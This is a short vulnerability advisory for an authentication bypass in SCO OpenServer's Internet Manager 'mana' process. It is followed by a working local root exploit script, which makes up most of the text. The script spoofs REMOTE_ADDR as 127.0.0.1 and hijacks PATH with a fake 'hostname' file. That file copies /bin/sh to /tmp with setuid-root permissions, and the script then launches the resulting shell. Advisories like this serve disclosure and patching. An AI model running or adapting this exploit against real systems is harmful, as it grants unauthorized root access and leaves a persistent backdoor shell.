source: http://www.securityfocus.com/bid/8616/info

It has been reported that SCO OpenServer Internet Manager 'mana' process is prone to an authentication bypass issue. The issue is reported to occur as a local user is able to export the REMOTE_ADDR environment variable and set its value to 127.0.0.1. This would cause the mana process to execute the file menu.mana with administrative privileges without proper authentication. Normally executing mana would require proper credentials.

#!/bin/sh
#
# OpenServer 5.0.7 - Local mana root shell
#
#

REMOTE_ADDR=127.0.0.1
PATH_INFO=/pass-err.mana
PATH=./:$PATH

export REMOTE_ADDR
export PATH_INFO
export PATH

echo "cp /bin/sh /tmp;chmod 4777 /tmp/sh;" > hostname

chmod 755 hostname

/usr/internet/admin/mana/mana > /dev/null

/tmp/sh